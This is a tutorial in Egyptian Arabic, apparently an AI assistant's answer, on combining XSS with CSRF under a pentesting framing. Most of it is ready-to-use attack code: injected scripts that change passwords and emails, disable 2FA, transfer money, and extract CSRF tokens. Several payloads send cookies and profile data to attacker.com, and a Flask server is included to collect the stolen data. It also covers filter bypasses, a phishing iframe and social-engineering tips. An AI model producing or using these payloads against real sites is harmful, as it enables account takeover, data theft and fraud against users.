تمام، هنشرح بعمق كيفية استغلال **XSS (Cross-Site Scripting)** بالتكامل مع **CSRF (Cross-Site Request Forgery)** من منظور عملي كـ **Pentester**، مع تركيز على الأوامر والأكواد اللي بتساعد في تنفيذ الهجوم. هنقسم الموضوع لأجزاء واضحة، مع خلاصة بالعامية المصرية بعد كل جزء، وفي النهاية هنعمل لستة بكل السيناريوهات الممكنة للاستغلال. هنفترض إنك عندك خلفية في اختبار الاختراق ومفاهيم الـ Web، وهنربط الموضوع بالشرح السابق عن CSRF وSame-Origin Policy (SOP).

---

### **1. مفهوم استغلال XSS مع CSRF بعمق**
**XSS** هي ثغرة بتخليك تحقن كود JavaScript في صفحة موقع، فيشتغل في سياق الموقع نفسه. **CSRF** بيستغل ثقة الموقع في جلسة المستخدم عشان ينفذ طلبات غير مرغوبة (زي تغيير كلمة السر). لما تجمع الاتنين، الهجوم بيبقى أخطر بكتير لأن:
- XSS بتتيح لك تنفيذ طلبات CSRF من **داخل الموقع**، فبتتجاوز حمايات زي **SameSite Cookies** أو **CORS**.
- XSS بتخليك تقرأ ردود الطلبات (Response) اللي CSRF لوحده مش بيقدر يعملها بسبب SOP.
- الدمج ده بيسمحلك تسيطر على الحساب أو تسرق بيانات حساسة (زي توكنات الجلسة أو بيانات المستخدم).

#### **لماذا الدمج خطير؟**
- XSS بتخليك تنفذ الطلبات في سياق الموقع، فالطلب بيبقى زي لو المستخدم نفسه بيبعته.
- بتقدر تستغل XSS عشان تبعت طلبات CSRF تلقائياً بدون ما تحتاج تخدّع الضحية تفتح رابط خارجي.
- XSS بتديك تحكم أكبر، زي سرقة Cookies، توكنات، أو حتى تنفيذ سلسلة من الطلبات.

#### **الخلاصة بالعامية**:
XSS مع CSRF زي ما تكون لقيت مفتاح الباب (XSS) ودخلت البيت (الموقع) وبدأت تعمل طلبات زي تغيير الباسوورد (CSRF) من جوه. XSS بتخليك تتحكم في الموقع زي ما تحب، وCSRF بيديك القدرة تغير حاجات حساسة بدون ما الضحية يحس.

---

### **2. الجانب الفني: كيف تستغل XSS مع CSRF؟**
لتنفيذ هجوم يدمج XSS وCSRF، لازم تستغل ثغرة XSS عشان تحقن كود JavaScript ينفذ طلب CSRF من داخل الموقع. الهدف هو تنفيذ إجراءات حساسة (زي تغيير كلمة السر، تحويل فلوس، أو سرقة بيانات) مع القدرة على قراءة الردود.

#### **خطوات تنفيذ الهجوم عملياً**:
1. **إيجاد ثغرة XSS**:
   - ابحث عن حقول إدخال (مثل تعليقات، نماذج، أو URLs) مش مفلترة كويس.
   - جرب حقن كود بسيط زي:
     ```html
     <script>alert(1)</script>
     ```
     أو
     ```html
     <img src=x onerror=alert(1)>
     ```
   - لو الكود نفّذ، يبقى فيه ثغرة XSS.

2. **تحليل طلبات الموقع**:
   - استخدم **Burp Suite** أو **OWASP ZAP** لتفحص الطلبات الحساسة (GET/POST) زي:
     - `/change-password` (تغيير كلمة السر).
     - `/transfer` (تحويل فلوس).
     - `/api/user-profile` (جلب بيانات المستخدم).
   - شوف لو فيه **CSRF Token** أو حمايات زي **SameSite Cookies** أو **Referer**.

3. **إنشاء كود XSS ينفذ CSRF**:
   - استخدم JavaScript عشان تبعت طلب CSRF من داخل الموقع.
   - لو فيه CSRF Token، حاول تستخرجه باستخدام XSS قبل ما تبعت الطلب.

4. **توصيل الهجوم للضحية**:
   - أدخل كود XSS في الموقع (مثل في تعليق أو رابط).
   - لما الضحية يشوف الكود (زي تعليقك)، الكود هينفذ وينفذ طلب CSRF.

#### **مثال عملي 1: تغيير كلمة السر باستخدام XSS + CSRF**
افترض موقع فيه ثغرة XSS في حقل تعليقات، والموقع بيغير كلمة السر بطلب POST:
```
POST /change-password
Content-Type: application/x-www-form-urlencoded
new_password=attacker123
```
- **كود XSS**:
  ```javascript
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/change-password', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('new_password=attacker123');
  ```
- **حقن الكود**:
  - أدخل الكود في حقل التعليقات:
    ```html
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/change-password', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('new_password=attacker123');
    </script>
    ```
  - لما الضحية (زي أدمن أو مستخدم) يشوف التعليق، كلمة السر هتتغير، وتقدر تسجل دخول بالباسوورد الجديد.

#### **مثال عملي 2: سرقة بيانات المستخدم مع CSRF**
افترض موقع بيديك بيانات المستخدم بطلب GET:
```
/api/user-profile
```
وبتقدر تغير الإيميل بطلب POST:
```
POST /update-email
Content-Type: application/x-www-form-urlencoded
email=attacker@example.com
```
- **كود XSS**:
  ```javascript
  // نفّذ طلب CSRF لتغيير الإيميل
  var xhr1 = new XMLHttpRequest();
  xhr1.open('POST', '/update-email', true);
  xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr1.send('email=attacker@example.com');

  // سرقة بيانات المستخدم
  var xhr2 = new XMLHttpRequest();
  xhr2.open('GET', '/api/user-profile', true);
  xhr2.onload = function() {
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(xhr2.responseText));
  };
  xhr2.send();
  ```
- **حقن الكود**:
  - أدخل الكود في حقل XSS (مثل تعليق أو URL):
    ```html
    <img src=x onerror="var xhr1=new XMLHttpRequest();xhr1.open('POST','/update-email',true);xhr1.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr1.send('email=attacker@example.com');var xhr2=new XMLHttpRequest();xhr2.open('GET','/api/user-profile',true);xhr2.onload=function(){fetch('https://attacker.com/steal?data='+encodeURIComponent(xhr2.responseText))};xhr2.send();">
    ```
  - الكود هيغير الإيميل ويسرق بيانات المستخدم (زي الاسم أو التوكن) ويبعتها لسيرفرك.

#### **مثال عملي 3: استخراج CSRF Token باستخدام XSS**
لو الموقع بيستخدم CSRF Token، ممكن تستخدم XSS عشان تستخرج الـ Token من الصفحة ثم تنفذ طلب CSRF.
- **كود XSS**:
  ```javascript
  // استخراج CSRF Token من حقل مخفي في النموذج
  var token = document.querySelector('input[name="csrf_token"]').value;

  // تنفيذ طلب CSRF
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/change-password', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('new_password=attacker123&csrf_token=' + token);
  ```
- **حقن الكود**:
  - أدخل الكود في حقل XSS:
    ```html
    <script>
      var token = document.querySelector('input[name="csrf_token"]').value;
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/change-password', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('new_password=attacker123&csrf_token=' + token);
    </script>
    ```
  - الكود هيستخرج الـ Token ويغير كلمة السر حتى لو الموقع محمي.

#### **استخدام أدوات**:
- **Burp Suite**:
  - سجّل طلبات الموقع (POST/GET) وحدد الطلبات الحساسة.
  - استخدم **Engagement Tools > Generate CSRF PoC** لإنشاء كود CSRF أساسي، ثم دمجه مع XSS.
  - مثال PoC مع XSS:
    ```html
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/change-password', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('new_password=attacker123');
    </script>
    ```
- **OWASP ZAP**:
  - استخدم ZAP لإيجاد ثغرات XSS تلقائياً.
  - جرب حقن كود JavaScript زي المثال السابق.
- **Python Flask** (لإنشاء سيرفر يستقبل البيانات المسروقة):
  ```python
  from flask import Flask, request

  app = Flask(__name__)

  @app.route('/steal')
  def steal_data():
      data = request.args.get('data')
      with open('stolen.txt', 'a') as f:
          f.write(data + '\n')
      return 'OK'

  if __name__ == '__main__':
      app.run(host='0.0.0.0', port=5000)
  ```
  - ارفع الكود على سيرفرك، واستخدمه لتخزين البيانات المسروقة.

#### **الخلاصة بالعامية**:
XSS زي السلاح السري اللي بيخليك تدخل الموقع وتعمل طلبات CSRF من جوه. ابحث عن ثغرة XSS في تعليقات أو حقول، وحقن كود JavaScript يغير باسوورد أو يسرق بيانات. لو فيه CSRF Token، استخدم XSS عشان تستخرجه. Burp وZAP هيسهلوا عليك، واعمل سيرفر يستقبل البيانات المسروقة.

---

### **3. تحليل الحمايات وتجاوزها**
المواقع الحديثة بتحط حمايات ضد XSS وCSRF، وكـ Pentester لازم تختبرها وتشوف إزاي تتجاوزها.

#### **أنواع الحمايات**:
1. **CSRF Token**:
   - رمز عشوائي بيترسل مع الطلبات الحساسة.
   - **التجاوز**: استخدم XSS لاستخراج الـ Token من الصفحة (زي المثال السابق).
2. **SameSite Cookies**:
   - Cookies معمولها `SameSite=Strict` بتمنع إرسالها مع طلبات خارجية.
   - **التجاوز**: XSS بتخليك تنفذ الطلب من داخل الموقع، فـ SameSite مش هيأثر.
3. **Content Security Policy (CSP)**:
   - CSP بيحدد مصادر السكربتات المسموح بيها.
   - **التجاوز**: ابحث عن إعدادات CSP ضعيفة (مثل `unsafe-inline`) أو مصادر خارجية موثوقة ممكن تستغلها.
4. **XSS Filtering**:
   - الموقع بيفلتر الإدخال عشان يمنع حقن JavaScript.
   - **التجاوز**: جرب طرق غير مباشرة زي:
     ```html
     <img src=x onerror=fetch('//attacker.com')>
     ```
     أو استخدم أحداث HTML تانية زي `onfocus` أو `onmouseover`.

#### **اختبار عملي**:
- **اختبار XSS**:
  - جرب حقن أكواد مختلفة في حقول الإدخال:
    ```html
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    ```
  - لو نجح أي كود، يبقى فيه ثغرة.
- **اختبار CSRF Token**:
  - استخدم XSS لاستخراج الـ Token:
    ```javascript
    var token = document.querySelector('input[name="csrf_token"]').value;
    alert(token); // للاختبار
    ```
  - لو قدرت تستخرج الـ Token، نفّذ طلب CSRF.
- **اختبار CSP**:
  - فحّص رأس CSP في الاستجابة:
    ```bash
    curl -I https://example.com
    ```
  - لو لقيت `script-src 'unsafe-inline'`، جرب حقن `<script>` مباشرة.
- **اختبار SameSite Cookies**:
  - فحّص الـ Cookies في DevTools (F12).
  - لو `SameSite=Strict`، استخدم XSS عشان الطلب يطلع من داخل الموقع.

#### **الخلاصة بالعامية**:
لو الموقع حاطط حماية زي CSRF Token، استخدم XSS عشان تستخرج الـ Token. لو فيه CSP أو فلاتر، جرب أكواد غريبة زي `onerror` أو `svg`. SameSite Cookies مش هيأثر لأنك بتنفذ من جوه الموقع. فحّص كل حاجة بعناية، واستخدم Burp عشان تشوف الثغرة.

---

### **4. سيناريوهات استغلال XSS مع CSRF**

#### **سيناريو 1: سرقة الحساب بتغيير كلمة السر**
- **الوصف**: ثغرة XSS في تعليقات، وموقع بيسمح بتغيير كلمة السر بطلب POST.
- **الاستغلال**:
  - حقن كود في التعليقات:
    ```html
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/change-password', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('new_password=attacker123');
    </script>
    ```
  - لما الضحية يشوف التعليق، كلمة السر هتتغير، وتقدر تسجل دخول.

#### **سيناريو 2: سرقة بيانات المستخدم**
- **الوصف**: XSS في حقل إدخال، وAPI بيدي بيانات المستخدم.
- **الاستغلال**:
  - حقن كود:
    ```html
    <img src=x onerror="fetch('/api/user-profile').then(r=>r.text()).then(d=>fetch('https://attacker.com/steal?data='+encodeURIComponent(d)))">
    ```
  - الكود هيسرق بيانات زي الإيميل أو التوكن ويبعتها لسيرفرك.

#### **سيناريو 3: تجاوز CSRF Token**
- **الوصف**: موقع بيستخدم CSRF Token، لكن فيه ثغرة XSS.
- **الاستغلال**:
  - حقن كود يستخرج الـ Token:
    ```html
    <script>
      var token = document.querySelector('input[name="csrf_token"]').value;
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/change-password', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('new_password=attacker123&csrf_token=' + token);
    </script>
    ```
  - الكود هيغير كلمة السر حتى لو فيه حماية.

#### **سيناريو 4: تحويل أموال**
- **الوصف**: موقع بنك فيه XSS، وبيسمح بتحويل فلوس بطلب POST.
- **الاستغلال**:
  - حقن كود:
    ```html
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/transfer', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('amount=1000&to=attacker_account');
    </script>
    ```
  - الكود هيحول فلوس لحسابك.

#### **سيناريو 5: تعطيل المصادقة الثنائية (2FA)**
- **الوصف**: موقع بيسمح بتعطيل 2FA بطلب POST، وفيه XSS.
- **الاستغلال**:
  - حقن كود:
    ```html
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/disable-2fa', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('disable=true');
    </script>
    ```
  - بعد تعطيل 2FA، نفّذ طلب CSRF لتغيير الباسوورد.

#### **سيناريو 6: سرقة Cookies**
- **الوصف**: XSS بتخليك تسرق Cookies الجلسة.
- **الاستغلال**:
  - حقن كود:
    ```html
    <img src=x onerror="fetch('https://attacker.com/steal?cookies='+encodeURIComponent(document.cookie))">
    ```
  - استخدم الـ Cookies للسيطرة على الجلسة، ثم نفّذ طلبات CSRF.

#### **سيناريو 7: دمج مع Phishing**
- **الوصف**: استخدام XSS لتحميل صفحة مزيفة تنفذ CSRF.
- **الاستغلال**:
  - حقن كود يعرض إطار (iframe) مزيف:
    ```html
    <iframe src="https://attacker.com/fake-login" style="width:100%;height:100%"></iframe>
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/change-password', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('new_password=attacker123');
    </script>
    ```
  - الإطار هيخدّع الضحية، والكود هينفذ CSRF.

#### **سيناريو 8: تنفيذ سلسلة طلبات**
- **الوصف**: XSS بتخليك تنفذ أكتر من طلب CSRF لتدمير الحساب.
- **الاستغلال**:
  - حقن كود:
    ```html
    <script>
      // تغيير الإيميل
      var xhr1 = new XMLHttpRequest();
      xhr1.open('POST', '/update-email', true);
      xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr1.send('email=attacker@example.com');

      // تعطيل 2FA
      var xhr2 = new XMLHttpRequest();
      xhr2.open('POST', '/disable-2fa', true);
      xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr2.send('disable=true');

      // سرقة البيانات
      fetch('/api/user-profile').then(r=>r.text()).then(d=>fetch('https://attacker.com/steal?data='+encodeURIComponent(d)));
    </script>
    ```
  - الكود هيسيطر على الحساب بالكامل.

#### **الخلاصة بالعامية**:
XSS مع CSRF زي قنبلة. لو لقيت ثغرة XSS، حقن كود يعمل طلبات CSRF زي تغيير باسوورد، تحويل فلوس، أو سرقة بيانات. لو فيه Token، استخدم XSS عشان تسرقه. جرب كل حاجة زي تعطيل 2FA أو سرقة Cookies. حط الكود في تعليق أو رابط، ولما الضحية يشوفه، الحساب بتاعك.

---

### **5. نصائح للـ Pentester**
1. **ابحث عن XSS في كل مكان**:
   - فحّص التعليقات، النماذج، URLs، وحتى الـ Query Parameters.
2. **حدد الطلبات الحساسة**:
   - ركز على طلبات زي تغيير الباسوورد، الإيميل، أو تحويل فلوس.
3. **استخدم أدوات ذكية**:
   - Burp Suite وZAP بيساعدوك تلاقي XSS وتصمم هجمات CSRF.
4. **دمج مع Social Engineering**:
   - خلّي الضحية يشوف الكود (مثل تعليق أو رابط) بطريقة مقنعة.
5. **وثّق الثغرة**:
   - اعمل PoC يورّي إزاي نفذت طلب CSRF باستخدام XSS، وشرح التأثير (مثل سرقة الحساب).

---

### **الخلاصة النهائية بالعامية**:
XSS مع CSRF زي ما تكون داخل الموقع وبتعمل اللي عايزه. لو لقيت ثغرة XSS، حط كود JavaScript ينفذ طلبات CSRF زي تغيير باسوورد أو سرقة بيانات. لو فيه CSRF Token، سرقه بـ XSS. جرب كل حاجة حساسة زي تحويل فلوس، تعطيل 2FA، أو سرقة Cookies. استخدم Burp وZAP، وحط الكود في مكان الضحية يشوفه زي تعليق أو رابط. لو عايز تفاصيل أكتر عن أي سيناريو، قولي!

```html
<html>
  <body>
    <script>
      // استخراج CSRF Token (لو موجود)
      var token = document.querySelector('input[name="csrf_token"]')?.value || '';

      // تنفيذ طلب CSRF لتغيير كلمة السر
      var xhr1 = new XMLHttpRequest();
      xhr1.open('POST', '/change-password', true);
      xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr1.send('new_password=attacker123&csrf_token=' + token);

      // سرقة بيانات المستخدم
      var xhr2 = new XMLHttpRequest();
      xhr2.open('GET', '/api/user-profile', true);
      xhr2.onload = function() {
        fetch('https://attacker.com/steal?data=' + encodeURIComponent(xhr2.responseText));
      };
      xhr2.send();
    </script>
  </body>
</html>
```